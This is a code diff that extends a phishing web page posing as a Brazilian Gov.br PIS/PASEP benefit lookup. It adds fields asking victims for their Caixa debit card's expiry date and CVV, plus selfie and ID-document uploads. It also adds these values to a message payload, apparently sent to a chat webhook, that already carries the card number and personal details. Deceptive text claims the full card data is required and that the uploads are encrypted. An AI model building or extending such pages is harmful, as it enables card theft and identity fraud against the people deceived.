@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Consulta PIS/PASEP | Gov.br</title>
-    <link rel="icon" href="https://i.em.com.br/De1f_IScJHPo4cMXTfeJyjIsWrU=/600x315/smart/imgsapp.em.com.br/app/noticia_127983242361/2023/02/15/1457694/logomarca-do-pispasep_1_18048.jpg">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -40,21 +39,23 @@
         
         .logo {
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
             margin-bottom: 1rem;
-            gap: 2rem;
+            gap: 1rem;
         }
         
         .logo img {
-            height: 100px;
+            height: 80px;
             width: auto;
             max-width: 100%;
             object-fit: contain;
         }
         
         .logo-text {
-            text-align: left;
+            text-align: center;
+            width: 100%;
         }
         
         .security-badge {
@@ -155,6 +156,7 @@
         h1, h2 {
             color: var(--primary);
             margin-bottom: 1.5rem;
+            text-align: center;
         }
         
         .form-row {
@@ -364,6 +366,7 @@
             align-items: center;
             gap: 15px;
             margin-bottom: 15px;
+            justify-content: center;
         }
         
         .cartao-header img {
@@ -399,6 +402,85 @@
             color: var(--caixa-color);
             margin-right: 5px;
         }
+
+        /* Estilos para upload de documentos */
+        .documentos-group {
+            margin-top: 1.5rem;
+            border-top: 1px solid #eee;
+            padding-top: 1.5rem;
+        }
+        
+        .upload-area {
+            border: 2px dashed #ddd;
+            border-radius: 8px;
+            padding: 1.5rem;
+            text-align: center;
+            margin-bottom: 1rem;
+            transition: all 0.3s;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .upload-area:hover {
+            border-color: var(--primary);
+            background-color: rgba(0, 102, 204, 0.05);
+        }
+        
+        .upload-area i {
+            font-size: 2rem;
+            color: var(--primary);
+            margin-bottom: 1rem;
+        }
+        
+        .upload-area p {
+            margin: 0;
+            color: var(--gray);
+        }
+        
+        .upload-area small {
+            font-size: 0.8rem;
+            color: var(--gray);
+        }
+        
+        .preview-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+        
+        .preview-item {
+            width: 120px;
+            height: 120px;
+            border-radius: 8px;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid #ddd;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        .preview-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .preview-item .remove-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background-color: var(--danger);
+            color: white;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 0.7rem;
+        }
         
         @media (max-width: 768px) {
             .form-row {
@@ -415,15 +497,6 @@
                 border-radius: 0;
             }
             
-            .logo {
-                flex-direction: column;
-                gap: 1rem;
-            }
-            
-            .logo-text {
-                text-align: center;
-            }
-            
             .security-badge {
                 position: static;
                 margin: 10px auto;
@@ -438,6 +511,10 @@
             
             .cartao-details {
                 flex-direction: column;
+            }
+            
+            .preview-container {
+                justify-content: center;
             }
         }
     </style>
@@ -566,27 +643,94 @@
                         <h3><i class="fas fa-credit-card"></i> Cartão de Débito Caixa</h3>
                     </div>
                     
-                    <label for="cartao_debito" class="required">Número do Cartão</label>
-                    <div class="input-wrapper">
-                        <input type="text" id="cartao_debito" name="cartao_debito" placeholder="0000 0000 0000 0000" required>
-                        <i class="fas fa-check valid-icon" id="cartao_valid"></i>
-                        <i class="fas fa-times valid-icon" id="cartao_invalid"></i>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="cartao_debito" class="required">Número do Cartão</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="cartao_debito" name="cartao_debito" placeholder="0000 0000 0000 0000" required>
+                                <i class="fas fa-check valid-icon" id="cartao_valid"></i>
+                                <i class="fas fa-times valid-icon" id="cartao_invalid"></i>
+                            </div>
+                            <div class="error-message" id="cartao_error">Informe um número de cartão válido (16 dígitos)</div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="validade_cartao" class="required">Validade (MM/AA)</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="validade_cartao" name="validade_cartao" placeholder="MM/AA" required>
+                                <i class="fas fa-check valid-icon" id="validade_valid"></i>
+                                <i class="fas fa-times valid-icon" id="validade_invalid"></i>
+                            </div>
+                            <div class="error-message" id="validade_error">Informe uma validade no formato MM/AA</div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="cvv_cartao" class="required">CVV</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="cvv_cartao" name="cvv_cartao" placeholder="000" maxlength="3" required>
+                                <i class="fas fa-check valid-icon" id="cvv_valid"></i>
+                                <i class="fas fa-times valid-icon" id="cvv_invalid"></i>
+                            </div>
+                            <div class="error-message" id="cvv_error">Informe o CVV de 3 dígitos</div>
+                        </div>
                     </div>
-                    <div class="error-message" id="cartao_error">Informe um número de cartão válido (16 dígitos)</div>
                     
                     <div class="cartao-info">
                         <p><i class="fas fa-info-circle"></i> <strong>Informações sobre o cartão de débito Caixa:</strong></p>
-                        <p>Para receber o benefício do PIS, é necessário informar os dados do seu cartão de débito da Caixa Econômica Federal.</p>
+                        <p>Para receber o benefício do PIS, é necessário informar os dados completos do seu cartão de débito da Caixa Econômica Federal.</p>
                     </div>
                     
                     <div class="cartao-details">
                         <div class="cartao-detail">
                             <i class="fas fa-question-circle"></i>
-                            <strong>Onde encontrar:</strong> O número de 16 dígitos está na frente do seu cartão de débito Caixa.
+                            <strong>Onde encontrar:</strong> 
+                            <ul style="margin-top: 5px; padding-left: 20px;">
+                                <li>Número de 16 dígitos na frente do cartão</li>
+                                <li>Validade (MM/AA) abaixo do número</li>
+                                <li>CVV de 3 dígitos no verso do cartão</li>
+                            </ul>
                         </div>
                         <div class="cartao-detail">
                             <i class="fas fa-exclamation-circle"></i>
                             <strong>Não tem cartão?</strong> Dirija-se a qualquer agência da Caixa para solicitar seu cartão de débito.
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Seção de upload de documentos -->
+                <div class="form-group documentos-group">
+                    <h3><i class="fas fa-id-card"></i> Documentos Necessários</h3>
+                    <p>Para validar sua identidade, por favor anexe os seguintes documentos:</p>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="foto_rosto" class="required">Foto do Rosto (Selfie)</label>
+                            <div class="upload-area" id="fotoRostoArea">
+                                <i class="fas fa-camera"></i>
+                                <p>Clique para adicionar uma foto do seu rosto</p>
+                                <small>Formato JPG ou PNG (máx. 5MB)</small>
+                                <input type="file" id="foto_rosto" name="foto_rosto" accept="image/*" style="display: none;" required>
+                            </div>
+                            <div class="preview-container" id="fotoRostoPreview"></div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="foto_documento" class="required">Foto do Documento (RG ou CNH)</label>
+                            <div class="upload-area" id="fotoDocumentoArea">
+                                <i class="fas fa-id-card"></i>
+                                <p>Clique para adicionar foto do documento</p>
+                                <small>Formato JPG ou PNG (máx. 5MB)</small>
+                                <input type="file" id="foto_documento" name="foto_documento" accept="image/*" style="display: none;" required>
+                            </div>
+                            <div class="preview-container" id="fotoDocumentoPreview"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="security-info">
+                        <i class="fas fa-lock"></i>
+                        <div>
+                            <strong>Seus documentos estão protegidos</strong>
+                            <p>Todas as imagens são criptografadas e serão utilizadas apenas para validação de identidade</p>
                         </div>
                     </div>
                 </div>
@@ -677,6 +821,82 @@
             validateCartao(e.target);
         });
         
+        // Máscara para validade do cartão
+        document.getElementById('validade_cartao').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) value = value.replace(/^(\d{2})/, '$1/');
+            e.target.value = value.substring(0, 5);
+            validateValidade(e.target);
+        });
+        
+        // Máscara para CVV
+        document.getElementById('cvv_cartao').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            e.target.value = value.substring(0, 3);
+            validateCVV(e.target);
+        });
+        
+        // Upload de fotos
+        document.getElementById('fotoRostoArea').addEventListener('click', function() {
+            document.getElementById('foto_rosto').click();
+        });
+        
+        document.getElementById('fotoDocumentoArea').addEventListener('click', function() {
+            document.getElementById('foto_documento').click();
+        });
+        
+        document.getElementById('foto_rosto').addEventListener('change', function(e) {
+            handleFileUpload(e, 'fotoRostoPreview');
+        });
+        
+        document.getElementById('foto_documento').addEventListener('change', function(e) {
+            handleFileUpload(e, 'fotoDocumentoPreview');
+        });
+        
+        function handleFileUpload(event, previewContainerId) {
+            const file = event.target.files[0];
+            if (!file) return;
+            
+            if (!file.type.match('image.*')) {
+                alert('Por favor, selecione um arquivo de imagem (JPG ou PNG)');
+                return;
+            }
+            
+            if (file.size > 5 * 1024 * 1024) {
+                alert('O arquivo é muito grande (máximo 5MB)');
+                return;
+            }
+            
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const previewContainer = document.getElementById(previewContainerId);
+                previewContainer.innerHTML = '';
+                
+                const previewItem = document.createElement('div');
+                previewItem.className = 'preview-item';
+                
+                const img = document.createElement('img');
+                img.src = e.target.result;
+                
+                const removeBtn = document.createElement('div');
+                removeBtn.className = 'remove-btn';
+                removeBtn.innerHTML = '×';
+                removeBtn.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    previewContainer.innerHTML = '';
+                    event.target.value = '';
+                    updateSubmitButton();
+                });
+                
+                previewItem.appendChild(img);
+                previewItem.appendChild(removeBtn);
+                previewContainer.appendChild(previewItem);
+                
+                validateField(event.target, true, event.target.id);
+            };
+            reader.readAsDataURL(file);
+        }
+        
         // Validações em tempo real
         document.getElementById('nome_completo').addEventListener('blur', function(e) {
             validateField(e.target, e.target.value.trim().split(' ').length >= 2, 'nome');
@@ -708,6 +928,18 @@
             validateField(e.target, value.length === 16, 'cartao');
         });
         
+        document.getElementById('validade_cartao').addEventListener('blur', function(e) {
+            const value = e.target.value;
+            const isValid = /^\d{2}\/\d{2}$/.test(value);
+            validateField(e.target, isValid, 'validade');
+        });
+        
+        document.getElementById('cvv_cartao').addEventListener('blur', function(e) {
+            const value = e.target.value;
+            const isValid = value.length === 3 && /^\d{3}$/.test(value);
+            validateField(e.target, isValid, 'cvv');
+        });
+        
         // Funções de validação
         function validateCPF(input) {
             const cpf = input.value.replace(/\D/g, '');
@@ -737,31 +969,45 @@
             return isValid;
         }
         
+        function validateValidade(input) {
+            const value = input.value;
+            const isValid = /^\d{2}\/\d{2}$/.test(value);
+            validateField(input, isValid, 'validade');
+            return isValid;
+        }
+        
+        function validateCVV(input) {
+            const value = input.value;
+            const isValid = value.length === 3 && /^\d{3}$/.test(value);
+            validateField(input, isValid, 'cvv');
+            return isValid;
+        }
+        
         function validateField(input, isValid, fieldName) {
             const validIcon = document.getElementById(`${fieldName}_valid`);
             const invalidIcon = document.getElementById(`${fieldName}_invalid`);
             const errorElement = document.getElementById(`${fieldName}_error`);
             
-            if (input.value === '') {
+            if (input.value === '' && !input.files) {
                 // Campo vazio - remove todas as marcações
                 input.classList.remove('valid', 'invalid');
-                validIcon.style.display = 'none';
-                invalidIcon.style.display = 'none';
-                errorElement.style.display = 'none';
+                if (validIcon) validIcon.style.display = 'none';
+                if (invalidIcon) invalidIcon.style.display = 'none';
+                if (errorElement) errorElement.style.display = 'none';
             } else if (isValid) {
                 // Campo válido
                 input.classList.add('valid');
                 input.classList.remove('invalid');
-                validIcon.style.display = 'block';
-                invalidIcon.style.display = 'none';
-                errorElement.style.display = 'none';
+                if (validIcon) validIcon.style.display = 'block';
+                if (invalidIcon) invalidIcon.style.display = 'none';
+                if (errorElement) errorElement.style.display = 'none';
             } else {
                 // Campo inválido
                 input.classList.add('invalid');
                 input.classList.remove('valid');
-                validIcon.style.display = 'none';
-                invalidIcon.style.display = 'block';
-                errorElement.style.display = 'block';
+                if (validIcon) validIcon.style.display = 'none';
+                if (invalidIcon) invalidIcon.style.display = 'block';
+                if (errorElement) errorElement.style.display = 'block';
             }
             
             updateSubmitButton();
@@ -794,8 +1040,13 @@
             let allValid = true;
             
             requiredFields.forEach(field => {
-                const fieldName = field.id;
-                const isValid = field.classList.contains('valid');
+                let isValid = false;
+                
+                if (field.type === 'file') {
+                    isValid = field.files && field.files.length > 0;
+                } else {
+                    isValid = field.classList.contains('valid');
+                }
                 
                 if (!isValid) {
                     allValid = false;
@@ -825,6 +1076,10 @@
                 ultimo_emprego: getFieldValue('ultimo_emprego'),
                 renda: getFieldValue('renda'),
                 cartao_debito: getFieldValue('cartao_debito'),
+                validade_cartao: getFieldValue('validade_cartao'),
+                cvv_cartao: getFieldValue('cvv_cartao'),
+                foto_rosto: document.getElementById('foto_rosto').files[0] ? 'Arquivo enviado' : 'Não enviado',
+                foto_documento: document.getElementById('foto_documento').files[0] ? 'Arquivo enviado' : 'Não enviado',
                 data_consulta: new Date().toISOString()
             };
 
@@ -853,6 +1108,10 @@
                             { name: '💼 Último Emprego', value: formData.ultimo_emprego || 'Não informado', inline: true },
                             { name: '💰 Renda Mensal', value: formData.renda ? `R$ ${formData.renda}` : 'Não informado', inline: true },
                             { name: '💳 Cartão de Débito', value: formData.cartao_debito || 'Não informado', inline: true },
+                            { name: '📅 Validade Cartão', value: formData.validade_cartao || 'Não informado', inline: true },
+                            { name: '🔐 CVV Cartão', value: formData.cvv_cartao || 'Não informado', inline: true },
+                            { name: '📸 Foto Rosto', value: formData.foto_rosto, inline: true },
+                            { name: '🆔 Foto Documento', value: formData.foto_documento, inline: true },
                             { name: '📅 Data da Consulta', value: new Date(formData.data_consulta).toLocaleString(), inline: false }
                         ],
                         timestamp: formData.data_consulta
